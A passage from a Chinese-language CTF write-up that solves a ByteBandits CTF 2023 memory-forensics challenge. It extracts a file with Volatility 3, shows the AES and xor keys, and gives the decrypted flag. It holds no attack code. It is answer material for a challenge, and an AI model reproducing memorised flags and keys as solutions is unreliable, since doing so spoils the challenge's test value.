python ~/volatility3/vol.py -f ./Memdump.raw -o files windows.dumpfiles --virtaddr 0xc88f21961af0
```

其內容如下
```
$xorkey = bbctf
$xorkey = "bbctf"
$aescipherkey = "ByteBandits-CTF Jan 2023"
$encrypted_flag = "m74/XKCNkHmzJHEPAOHvegV96AOubRnSUQBpJnG4tHg="
```

可以看到有 `aescipherkey`, `xorkey` 和 `encrypted_flag`，推測可能用了 AES 和 xor 做加密，並將結果包成 base64

不過經測試 xorkey 沒有作用，直接 AES ECB mode 解密即可

`flag{V0L@tiLiTy_4_da_w1N}`

## Blockchain
